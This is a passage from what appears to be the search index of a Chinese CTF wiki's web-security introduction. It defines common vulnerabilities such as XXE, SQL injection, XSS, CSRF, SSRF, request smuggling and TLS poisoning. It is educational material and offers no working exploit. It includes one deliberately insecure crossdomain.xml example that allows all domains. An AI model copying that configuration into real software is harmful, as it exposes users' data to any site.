\u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\uff0c\u548c\u865a\u62df\u5316\u6280\u672f\u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2a VPS \u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51 IP \u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540c VPS \u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU \u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u72ec\u5360\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS \u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS \u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e IDC \u8d44\u6e90\u79df\u7528\u3002 IDC \u8d44\u6e90\u79df\u7528\uff0c\u7531 VPS \u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540c VPS \u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6 VPS \u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS \u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662f VPS \u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS \u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668 VPS \u7684\u4ef7\u683c\u90fd\u4f4e\u4e8e\u865a\u62df\u673a VPS \u7684\u4ef7\u683c\u3002 \u6761\u4ef6\u7ade\u4e89 \u00b6 \u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u5728\u5904\u7406\u4e0d\u540c\u7528\u6237\u7684\u8bf7\u6c42\u65f6\u662f\u5e76\u53d1\u8fdb\u884c\u7684\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u5e76\u53d1\u5904\u7406\u4e0d\u5f53\u6216\u76f8\u5173\u64cd\u4f5c\u903b\u8f91\u987a\u5e8f\u8bbe\u8ba1\u7684\u4e0d\u5408\u7406\u65f6\uff0c\u5c06\u4f1a\u5bfc\u81f4\u6b64\u7c7b\u95ee\u9898\u7684\u53d1\u751f\u3002 XXE \u00b6 XXE Injection \u5373 XML External Entity Injection\uff0c\u4e5f\u5c31\u662f XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb.\u6f0f\u6d1e\u662f\u5728\u5bf9\u975e\u5b89\u5168\u7684\u5916\u90e8\u5b9e\u4f53\u6570\u636e\u8fdb\u2f8f\u884c\u5904\u7406\u65f6\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u3002 \u5728 XML 1.0 \u6807\u51c6\u91cc\uff0cXML \u6587\u6863\u7ed3\u6784\u2fa5\u91cc\u5b9a\u4e49\u4e86\u5b9e\u4f53\uff08entity\uff09\u8fd9\u4e2a\u6982\u5ff5.\u5b9e\u4f53\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u5728\u6587\u6863\u4e2d\u8c03\u7528\uff0c\u5b9e\u4f53\u7684\u6807\u8bc6\u7b26\u53ef\u8bbf\u95ee\u672c\u5730\u6216\u8fdc\u7a0b\u5185\u5bb9.\u5982\u679c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5f15\u5165\u4e86\u300c\u6c61\u67d3\u300d\u6e90\uff0c\u5728\u5bf9 XML \u6587\u6863\u5904\u7406\u540e\u5219\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\u7b49\u5b89\u5168\u95ee\u9898\u3002 XSCH \u00b6 \u7531\u4e8e\u7f51\u7ad9\u5f00\u53d1\u8005\u5728\u4f7f\u7528 Flash\u3001Silverlight \u7b49\u8fdb\u884c\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u7684\u758f\u5ffd\uff0c\u6ca1\u6709\u5bf9\u8de8\u57df\u7b56\u7565\u6587\u4ef6\uff08crossdomain.xml\uff09\u8fdb\u884c\u6b63\u786e\u7684\u914d\u7f6e\u5bfc\u81f4\u95ee\u9898\u4ea7\u751f\u3002 \u4f8b\u5982\uff1a <cross-domain-policy> <allow-access-from domain= \u201c*\u201d/ > </cross-domain-policy> \u56e0\u4e3a\u8de8\u57df\u7b56\u7565\u6587\u4ef6\u914d\u7f6e\u4e3a * \uff0c\u4e5f\u5c31\u6307\u4efb\u610f\u57df\u7684 Flash \u90fd\u53ef\u4ee5\u4e0e\u5b83\u4ea4\u4e92\uff0c\u5bfc\u81f4\u53ef\u4ee5\u53d1\u8d77\u8bf7\u6c42\u3001\u83b7\u53d6\u6570\u636e\u3002 \u8d8a\u6743\uff08\u529f\u80fd\u7ea7\u8bbf\u95ee\u7f3a\u5931\uff09 \u00b6 \u8d8a\u6743\u6f0f\u6d1e\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u5b83\u7684\u5a01\u80c1\u5728\u4e8e\u4e00\u4e2a\u8d26\u6237\u5373\u53ef\u63a7\u5236\u5168\u7ad9\u7528\u6237\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e9b\u6570\u636e\u4ec5\u9650\u4e8e\u5b58\u5728\u6f0f\u6d1e\u529f\u80fd\u5bf9\u5e94\u7684\u6570\u636e\u3002\u8d8a\u6743\u6f0f\u6d1e\u7684\u6210\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u8be2\u65f6\u5bf9\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u8fc7\u5206\u76f8\u4fe1\u800c\u9057\u6f0f\u4e86\u6743\u9650\u7684\u5224\u5b9a\u3002\u6240\u4ee5\u6d4b\u8bd5\u8d8a\u6743\u5c31\u662f\u548c\u5f00\u53d1\u4eba\u5458\u62fc\u7ec6\u5fc3\u7684\u8fc7\u7a0b\u3002 \u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u00b6 \u654f\u611f\u4fe1\u606f\u6307\u4e0d\u4e3a\u516c\u4f17\u6240\u77e5\u6089\uff0c\u5177\u6709\u5b9e\u9645\u548c\u6f5c\u5728\u5229\u7528\u4ef7\u503c\uff0c\u4e22\u5931\u3001\u4e0d\u5f53\u4f7f\u7528\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u5bf9\u793e\u4f1a\u3001\u4f01\u4e1a\u6216\u4e2a\u4eba\u9020\u6210\u5371\u5bb3\u7684\u4fe1\u606f\u3002\u5305\u62ec\uff1a\u4e2a\u4eba\u9690\u79c1\u4fe1\u606f\u3001\u4e1a\u52a1\u7ecf\u8425\u4fe1\u606f\u3001\u8d22\u52a1\u4fe1\u606f\u3001\u4eba\u4e8b\u4fe1\u606f\u3001IT \u8fd0\u7ef4\u4fe1\u606f\u7b49\u3002 \u6cc4\u9732\u9014\u5f84\u5305\u62ec Github\u3001\u767e\u5ea6\u6587\u5e93\u3001Google code\u3001\u7f51\u7ad9\u76ee\u5f55\u7b49\u3002 \u9519\u8bef\u7684\u5b89\u5168\u914d\u7f6e \u00b6 Security Misconfiguration\uff1a\u6709\u65f6\u5019\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u906d\u53d7\u591a\u79cd\u653b\u51fb\u3002\u5728\u5df2\u7ecf\u90e8\u7f72\u7684\u5e94\u7528\u3001WEB \u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ee3\u7801\u5e93\u4ee5\u53ca\u6240\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u7684\u7ec4\u4ef6\u4e2d\uff0c\u90fd\u5e94\u8be5\u4f7f\u7528\u73b0\u6709\u7684\u6700\u4f73\u5b89\u5168\u914d\u7f6e\uff0c\u8fd9\u4e00\u70b9\u81f3\u5173\u91cd\u8981\u3002 \u8bf7\u6c42\u8d70\u79c1 \u00b6 \u5728 HTTP \u534f\u8bae\u4e2d\uff0c\u5b58\u5728\u4e24\u79cd Header \u6765\u6307\u5b9a\u8bf7\u6c42\u7684\u7ed3\u5c3e\uff0c\u5206\u522b\u662f Content-Length \u4ee5\u53ca Transfer-Encoding\u3002\u5728\u590d\u6742\u7684\u7f51\u7edc\u73af\u5883\u4e0b\uff0c\u4e0d\u540c\u7684\u670d\u52a1\u5668\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u5b9e\u73b0 RFC \u6807\u51c6\u3002\u56e0\u6b64\uff0c\u76f8\u540c\u7684 HTTP \u8bf7\u6c42\uff0c\u4e0d\u540c\u7684\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u5904\u7406\u7ed3\u679c\uff0c\u8fd9\u6837\u5c31\u4ea7\u751f\u4e86\u4e86\u5b89\u5168\u98ce\u9669\u3002 TLS \u6295\u6bd2 \u00b6 \u5728 TLS \u534f\u8bae\u4e2d\uff0c\u5b58\u5728\u4e00\u79cd\u4f1a\u8bdd\u590d\u7528\u673a\u5236\uff0c\u5f53\u652f\u6301\u8be5\u7c7b\u7279\u6027\u7684\u5ba2\u6237\u7aef\u8bbf\u95ee\u4e86\u6076\u610f TLS \u670d\u52a1\u5668\u540e\uff0c\u5ba2\u6237\u7aef\u4f1a\u5b58\u50a8\u6076\u610f\u670d\u52a1\u5668\u4e0b\u53d1\u7684 Session \uff0c\u5728\u5ba2\u6237\u7aef\u91cd\u7528\u4f1a\u8bdd\u65f6\uff0c\u914d\u5408 DNS Rebinding \u53ef\u4ee5\u5b9e\u73b0\u8ba9\u5ba2\u6237\u7aef\u53d1\u9001\u6076\u610f Session \u81f3\u5185\u7f51\u670d\u52a1\uff0c\u4ece\u800c\u8fbe\u5230 SSRF \u653b\u51fb\u6548\u679c\uff0c\u5305\u62ec\u53ef\u4ee5\u4efb\u610f\u5199\u5165 Memcached \u7b49\u5185\u7f51\u670d\u52a1\uff0c\u8fdb\u800c\u914d\u5408\u5176\u4ed6\u6f0f\u6d1e\u9020\u6210 RCE \u7b49\u5371\u5bb3\u3002 XS-Leaks \u00b6 \u8de8\u7ad9\u811a\u672c\u6cc4\u6f0f\uff08\u53c8\u79f0 XS-Leaks/XSLeaks\uff09\uff0c\u662f\u4e00\u7c7b\u5229\u7528 Web \u5e73\u53f0\u5185\u7f6e\u7684\u4fa7\u4fe1\u9053\u884d\u751f\u51fa\u6765\u7684\u6f0f\u6d1e\u3002\u5176\u539f\u7406\u662f\u5229\u7528\u7f51\u7edc\u4e0a\u7684\u8fd9\u79cd\u4fa7\u4fe1\u9053\u6765\u63ed\u793a\u7528\u6237\u7684\u654f\u611f\u4fe1\u606f\uff0c\u5982\u7528\u6237\u5728\u5176\u4ed6\u7f51\u7edc\u5e94\u7528\u4e2d\u7684\u6570\u636e\u3001\u7528\u6237\u672c\u5730\u73af\u5883\u4fe1\u606f\uff0c\u6216\u8005\u662f\u7528\u6237\u6240\u8fde\u63a5\u7684\u5185\u90e8\u7f51\u7edc\u4fe1\u606f\u7b49\u3002 \u8be5\u653b\u51fb\u5229\u7528\u4e86 Web \u5e73\u53f0\u7684\u6838\u5fc3\u539f\u5219--\u53ef\u7ec4\u5408\u6027\uff0c\u5373\u5141\u8bb8\u7f51\u7ad9\u4e4b\u95f4\u76f8\u4e92\u4f5c\u7528\uff0c\u5e76\u6ee5\u7528\u5408\u6cd5\u673a\u5236\u6765\u63a8\u65ad\u7528\u6237\u7684\u4fe1\u606f\u3002\u8be5\u653b\u51fb\u4e0e\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08CSRF\uff09\u6280\u672f\u4e3b\u8981\u533a\u522b\u5728\u4e8e XS-Leaks \u5e76\u4e0d\u4f2a\u9020\u7528\u6237\u8bf7\u6c42\u6267\u884c\u64cd\u4f5c\uff0c\u800c\u662f\u7528\u6765\u63a8\u65ad\u3001\u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3002 \u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u5404\u79cd\u5404\u6837\u7684\u529f\u80fd\u6765\u652f\u6301\u4e0d\u540c Web \u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4e92\u52a8\uff1b\u4f8b\u5982\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u4e00\u4e2a\u7f51\u7ad9\u52a0\u8f7d\u5b50\u8d44\u6e90\u3001\u5bfc\u822a\u6216\u5411\u53e6\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u6d88\u606f\u3002\u867d\u7136\u8fd9\u4e9b\u884c\u4e3a\u901a\u5e38\u53d7\u5230\u7f51\u7edc\u5e73\u53f0\u7684\u5b89\u5168\u673a\u5236\u7684\u9650\u5236\uff08\u4f8b\u5982\u540c\u6e90\u653f\u7b56\uff09\uff0c\u4f46 XS-Leaks \u5229\u7528\u4e86\u7f51\u7ad9\u4e4b\u95f4\u4e92\u52a8\u8fc7\u7a0b\u4e2d\u7684\u5404\u79cd\u884c\u4e3a\u6765\u6cc4\u9732\u7528\u6237\u4fe1\u606f\u3002 WAF \u00b6 Web \u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1aWAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWEB \u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9 HTTP/HTTPS \u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3a WEB \u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002 IDS \u00b6 IDS \u662f\u82f1\u6587 Intrusion Detection Systems \u7684\u7f29\u5199\uff0c\u4e2d\u6587\u610f\u601d\u662f\u300c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u300d\u3002\u4e13\u4e1a\u4e0a\u8bb2\u5c31\u662f\u4f9d\u7167\u4e00\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u901a\u8fc7\u8f6f\u3001\u786c\u4ef6\uff0c\u5bf9\u7f51\u7edc\u3001\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u51b5\u8fdb\u884c\u76d1\u89c6\uff0c\u5c3d\u53ef\u80fd\u53d1\u73b0\u5404\u79cd\u653b\u51fb\u4f01\u56fe\u3001\u653b\u51fb\u884c\u4e3a\u6216\u8005\u653b\u51fb\u7ed3\u679c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u7edc\u7cfb\u7edf\u8d44\u6e90\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u3002\u505a\u4e00\u4e2a\u5f62\u8c61\u7684\u6bd4\u55bb\uff1a\u5047\u5982\u9632\u706b\u5899\u662f\u4e00\u5e62\u5927\u697c\u7684\u95e8\u9501\uff0c\u90a3\u4e48 IDS \u5c31\u662f\u8fd9\u5e62\u5927\u697c\u91cc\u7684\u76d1\u89c6\u7cfb\u7edf\u3002\u4e00\u65e6\u5c0f\u5077\u722c\u7a97\u8fdb\u5165\u5927\u697c\uff0c\u6216\u5185\u90e8\u4eba\u5458\u6709\u8d8a\u754c\u884c\u4e3a\uff0c\u53ea\u6709\u5b9e\u65f6\u76d1\u89c6\u7cfb\u7edf\u624d\u80fd\u53d1\u73b0\u60c5\u51b5\u5e76\u53d1\u51fa\u8b66\u544a\u3002 IPS \u00b6 \u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff1aIntrusion Prevention System\uff09\u662f\u7535\u8111\u7f51\u7edc\u5b89\u5168\u8bbe\u65bd\uff0c\u662f\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff08Antivirus Programs\uff09\u548c\u9632\u706b\u5899\uff08Packet Filter\uff0cApplication Gateway\uff09\u7684\u8865\u5145\u3002\u5165\u4fb5\u9884\u9632\u7cfb\u7edf\uff08Intrusion-prevention system\uff09\u662f\u4e00\u90e8\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6216\u7f51\u7edc\u8bbe\u5907\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u80fd\u591f\u5373\u65f6\u7684\u4e2d\u65ad\u3001\u8c03\u6574\u6216\u9694\u79bb\u4e00\u4e9b\u4e0d\u6b63\u5e38\u6216\u662f\u5177\u6709\u4f24\u5bb3\u6027\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u3002 \u53c2\u8003\u8d44\u6599 \u00b6 WEB \u6e17\u900f Wiki","title":"Web \u7b80\u4ecb"},{"location":"web/introduction/#web","text":"\u968f\u7740 WEB 2.0\u3001\u793e\u4ea4\u7f51\u7edc\u3001\u5fae\u535a\u7b49\u7b49\u4e00\u7cfb\u5217\u65b0\u578b\u7684\u4e92\u8054\u7f51\u4ea7\u54c1\u7684\u8bde\u751f\uff0c\u57fa\u4e8e WEB \u73af\u5883\u7684\u4e92\u8054\u7f51\u5e94\u7528\u8d8a\u6765\u8d8a\u5e7f\u6cdb\uff0c\u4f01\u4e1a\u4fe1\u606f\u5316\u7684\u8fc7\u7a0b\u4e2d\u5404\u79cd\u5e94\u7528\u90fd\u67b6\u8bbe\u5728 WEB \u5e73\u53f0\u4e0a\uff0cWEB \u4e1a\u52a1\u7684\u8fc5\u901f\u53d1\u5c55\u4e5f\u5f15\u8d77\u9ed1\u5ba2\u4eec\u7684\u5f3a\u70c8\u5173\u6ce8\uff0c\u63a5\u8e35\u800c\u81f3\u7684\u5c31\u662f WEB \u5b89\u5168\u5a01\u80c1\u7684\u51f8\u663e\uff0c\u9ed1\u5ba2\u5229\u7528\u7f51\u7ad9\u64cd\u4f5c\u7cfb\u7edf\u7684\u6f0f\u6d1e\u548c WEB \u670d\u52a1\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f97\u5230 WEB \u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u8f7b\u5219\u7be1\u6539\u7f51\u9875\u5185\u5bb9\uff0c\u91cd\u5219\u7a83\u53d6\u91cd\u8981\u5185\u90e8\u6570\u636e\uff0c\u66f4\u4e3a\u4e25\u91cd\u7684\u5219\u662f\u5728\u7f51\u9875\u4e2d\u690d\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4f7f\u5f97\u7f51\u7ad9\u8bbf\u95ee\u8005\u53d7\u5230\u4fb5\u5bb3\u3002 \u5728 CTF \u7ade\u8d5b\u4e2d\uff0cWEB \u4e5f\u662f\u5360\u6bd4\u91cd\u5f88\u5927\u7684\u4e00\u4e2a\u65b9\u5411\u4e4b\u4e00\uff0cWEB \u7c7b\u7684\u9898\u76ee\u79cd\u7c7b\u7e41\u591a\uff0c\u77e5\u8bc6\u70b9\u7ec6\u788e\uff0c\u65f6\u6548\u6027\u5f3a\uff0c\u80fd\u7d27\u8ddf\u65f6\u4e0b\u70ed\u70b9\u6f0f\u6d1e\uff0c\u8d34\u8fd1\u5b9e\u6218\u3002 WEB \u7c7b\u7684\u9898\u76ee\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aSQL \u6ce8\u5165\u3001XSS \u8de8\u7ad9\u811a\u672c\u3001CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u6587\u4ef6\u5305\u542b\u3001\u6846\u67b6\u5b89\u5168\u3001PHP \u5e38\u89c1\u6f0f\u6d1e\u3001\u4ee3\u7801\u5ba1\u8ba1\u7b49\u3002","title":"Web \u7b80\u4ecb"},{"location":"web/introduction/#sql","text":"\u901a\u8fc7\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\u4e2d\u6ce8\u5165 SQL \u8bed\u6cd5\uff0c\u7834\u574f\u539f\u6709 SQL \u7ed3\u6784\uff0c\u8fbe\u5230\u7f16\u5199\u7a0b\u5e8f\u65f6\u610f\u6599\u4e4b\u5916\u7ed3\u679c\u7684\u653b\u51fb\u884c\u4e3a\u3002\u5176\u6210\u56e0\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e24\u4e2a\u539f\u56e0\u53e0\u52a0\u9020\u6210\u7684\uff1a \u7a0b\u5e8f\u7f16\u5199\u8005\u5728\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u548c\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\uff0c\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020 SQL \u8bed\u53e5 \u672a\u5bf9\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\u4fbf\u5c06\u53c2\u6570\u5185\u5bb9\u62fc\u63a5\u8fdb\u5165\u5230 SQL \u8bed\u53e5\u4e2d","title":"SQL \u6ce8\u5165"},{"location":"web/introduction/#xss","text":"\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002\u6076\u610f\u653b\u51fb\u8005\u5f80 WEB \u9875\u9762\u91cc\u63d2\u5165\u6076\u610f HTML \u4ee3\u7801\uff0c\u5f53\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u4e4b\u65f6\uff0c\u5d4c\u5165\u5176\u4e2d Web \u91cc\u9762\u7684 HTML \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u7279\u6b8a\u76ee\u7684\u3002","title":"XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb"},{"location":"web/introduction/#_1","text":"\u5f53\u5e94\u7528\u9700\u8981\u8c03\u7528\u4e00\u4e9b\u5916\u90e8\u7a0b\u5e8f\u53bb\u5904\u7406\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4f1a\u7528\u5230\u4e00\u4e9b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\u3002\u5982 PHP \u4e2d\u7684 system \u3001 exec \u3001 shell_exec \u7b49\uff0c\u5f53\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\uff0c\u5c06\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u5230\u6b63\u5e38\u547d\u4ee4\u4e2d\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u8fd8\u662f\u4e3b\u8981\u4ee5 PHP \u4e3a\u4e3b\u4ecb\u7ecd\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0cJava \u7b49\u5e94\u7528\u7684\u7ec6\u8282\u5f85\u8865\u5145\u3002","title":"\u547d\u4ee4\u6267\u884c"},{"location":"web/introduction/#_2","text":"\u5982\u679c\u5141\u8bb8\u5ba2\u6237\u7aef\u7528\u6237\u8f93\u5165\u63a7\u5236\u52a8\u6001\u5305\u542b\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u53ca\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u4e3b\u8981\u5305\u62ec\u672c\u5730\u6587\u4ef6\u5305\u542b\u548c\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u4e24\u79cd\u5f62\u5f0f\u3002","title":"\u6587\u4ef6\u5305\u542b"},{"location":"web/introduction/#csrf","text":"\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0cCSRF\uff09\u662f\u4e00\u79cd\u4f7f\u5df2\u767b\u5f55\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u67d0\u79cd\u52a8\u4f5c\u7684\u653b\u51fb\u3002\u56e0\u4e3a\u653b\u51fb\u8005\u770b\u4e0d\u5230\u4f2a\u9020\u8bf7\u6c42\u7684\u54cd\u5e94\u7ed3\u679c\uff0c\u6240\u4ee5 CSRF \u653b\u51fb\u4e3b\u8981\u7528\u6765\u6267\u884c\u52a8\u4f5c\uff0c\u800c\u975e\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002\u5f53\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u666e\u901a\u7528\u6237\u65f6\uff0cCSRF \u53ef\u4ee5\u5b9e\u73b0\u5728\u5176\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u8f6c\u79fb\u7528\u6237\u8d44\u91d1\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\u64cd\u4f5c\uff1b\u4f46\u662f\u5982\u679c\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7528\u6237\u65f6 CSRF \u5219\u53ef\u80fd\u5a01\u80c1\u5230\u6574\u4e2a WEB \u7cfb\u7edf\u7684\u5b89\u5168\u3002","title":"CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"},{"location":"web/introduction/#ssrf","text":"SSRF\uff08Server-Side Request Forgery\uff1a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002","title":"SSRF \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020"},{"location":"web/introduction/#_3","text":"\u5728\u7f51\u7ad9\u7684\u8fd0\u8425\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u8981\u5bf9\u7f51\u7ad9\u7684\u67d0\u4e9b\u9875\u9762\u6216\u8005\u5185\u5bb9\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u65f6\u4fbf\u9700\u8981\u4f7f\u7528\u5230\u7f51\u7ad9\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u5982\u679c\u4e0d\u5bf9\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236\u6216\u8005\u9650\u5236\u88ab\u7ed5\u8fc7\uff0c\u8be5\u529f\u80fd\u4fbf\u6709\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u4e8e\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u3001\u811a\u672c\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u8fdb\u800c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u670d\u52a1\u5668\u6ca6